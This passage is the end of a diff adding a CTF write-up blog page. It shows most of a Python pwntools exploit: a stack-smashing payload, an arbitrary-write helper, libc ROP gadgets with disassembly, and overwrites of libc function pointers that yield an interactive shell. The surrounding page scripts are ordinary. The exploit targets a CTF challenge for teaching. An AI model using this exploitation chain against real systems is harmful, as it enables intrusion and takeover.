+</span><span>            </span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0x5add011</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2cc;">: </span><span>manual_jump_rbp</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">0x48</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">40</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0x41414141 </span><span style="color:#ffa759;">if </span><span>should_fault </span><span style="color:#ffa759;">else </span><span>canary</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">48</span><span style="color:#ccc9c2cc;">: </span><span>target </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x34</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">56</span><span style="color:#ccc9c2cc;">: </span><span>pie_base</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">0x193e</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">80</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0x6942069420</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">200</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;please_give_me_flag</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        }</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">length</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">256</span><span>))
+</span><span>        </span><span style="color:#ffa759;">try</span><span>:
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&gt;&gt;&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">except</span><span>: </span><span style="font-style:italic;color:#5c6773;"># recvuntil will eof after it has crashed
+</span><span>            </span><span style="color:#ffa759;">pass
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">write_u32</span><span>(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">address</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">value</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">should_fault</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">False</span><span>):
+</span><span>        log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;writing u32 </span><span>{</span><span style="color:#f28779;">hex</span><span>(value)}</span><span style="color:#bae67e;"> to </span><span>{</span><span style="color:#f28779;">hex</span><span>(address)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>        </span><span style="color:#ffd580;">manual_jump_rbp_overwrite</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span>address)
+</span><span>        </span><span style="color:#ffd580;">manual_jump_rbp_overwrite</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span>value </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffffffff</span><span style="color:#ccc9c2cc;">, </span><span>manual_jump_rbp</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">should_fault</span><span style="color:#f29e74;">=</span><span>should_fault)
+</span><span>
+</span><span>    ADJUST_STACK </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x000d059b </span><span style="font-style:italic;color:#5c6773;"># jumps to wcscmp
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000d059b  4881c4f8000000     add     rsp, 0xf8
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000d05a2  5b                 pop     rbx {__saved_rbx}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000d05a3  5d                 pop     rbp {__saved_rbp}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000d05a4  415c               pop     r12 {__saved_r12}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000d05a6  415d               pop     r13 {__saved_r13}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000d05a8  415e               pop     r14 {__saved_r14}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000d05aa  415f               pop     r15 {__saved_r15}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000d05ac  e90f80f5ff         jmp     jumps_wcscmp
+</span><span>
+</span><span>    RDX_GADGET </span><span style="color:#f29e74;">= </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x0005139f
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># is a little screwy bc the needed rdx is 0x6942069420 which contains whitespace
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 0005139f  488b542450         mov     rdx, qword [rsp+0x50 {var_878_1}]
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000513a4  4b8d3c08           lea     rdi, [r8+r9]
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000513a8  4c89fe             mov     rsi, r15
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000513ab  48894c2440         mov     qword [rsp+0x40 {var_888_4}], rcx
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000513b0  4c894c2420         mov     qword [rsp+0x20 {var_8a8_6}], r9
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000513b5  4883c201           add     rdx, 0x1
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000513b9  4c89442428         mov     qword [rsp+0x28 {var_8a0_6}], r8
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000513be  e86d70fdff         call    jumps_memmove
+</span><span>
+</span><span>    BIG_POP_GADGET </span><span style="color:#f29e74;">= </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x0013076c </span><span style="font-style:italic;color:#5c6773;"># jumps to strcasecmp
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 0013076c  5b                 pop     rbx {__saved_rbx}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 0013076d  5d                 pop     rbp {__saved_rbp}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 0013076e  415c               pop     r12 {__saved_r12}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 00130770  415d               pop     r13 {__saved_r13}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 00130772  415e               pop     r14 {__saved_r14}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 00130774  e9077eefff         jmp     jumps___strcasecmp
+</span><span>
+</span><span>    MOV_RSI_R14 </span><span style="color:#f29e74;">= </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x000c651c
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000c651c  4c89f6             mov     rsi, r14
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000c651f  4889d7             mov     rdi, rdx
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000c6522  4d01e6             add     r14, r12
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000c6525  48891424           mov     qword [rsp {var_1a8}], rdx
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 000c6529  e85221f6ff         call    jumps_wcsnlen
+</span><span>
+</span><span>    MOV_RDI_R13 </span><span style="color:#f29e74;">= </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x0011de45 </span><span style="font-style:italic;color:#5c6773;"># calls rindex
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 0011de45  4c89ef             mov     rdi, r13
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 0011de48  41bc01000000       mov     r12d, 0x1
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 0011de4e  e89da7f0ff         call    jumps_rindex    
+</span><span>
+</span><span>
+</span><span>    </span><span style="color:#ffd580;">write_u32</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x219148</span><span style="color:#ccc9c2cc;">, </span><span>libc</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;syscall&#39;</span><span>]) </span><span style="font-style:italic;color:#5c6773;"># rindex
+</span><span>    </span><span style="color:#ffd580;">write_u32</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x219190</span><span style="color:#ccc9c2cc;">, </span><span>MOV_RDI_R13) </span><span style="font-style:italic;color:#5c6773;">#wcsnlen
+</span><span>    </span><span style="color:#ffd580;">write_u32</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x219110</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span>( MOV_RSI_R14 </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffffffff</span><span>) </span><span style="color:#f29e74;">&lt;&lt; </span><span style="color:#ffcc66;">8</span><span>) </span><span style="font-style:italic;color:#5c6773;"># strcasecmp
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># have to offset this by one bc the address contains whitespace
+</span><span>    </span><span style="color:#ffd580;">write_u32</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x219068</span><span style="color:#ccc9c2cc;">, </span><span>BIG_POP_GADGET)  </span><span style="font-style:italic;color:#5c6773;"># memmove
+</span><span>    </span><span style="color:#ffd580;">write_u32</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x219130</span><span style="color:#ccc9c2cc;">,  </span><span>RDX_GADGET) </span><span style="font-style:italic;color:#5c6773;"># wcscmp
+</span><span>    </span><span style="color:#ffd580;">write_u32</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x219098</span><span style="color:#ccc9c2cc;">, </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span>ADJUST_STACK</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">should_fault</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)</span><span style="font-style:italic;color:#5c6773;">#) # strlen
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">13 January 2024</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
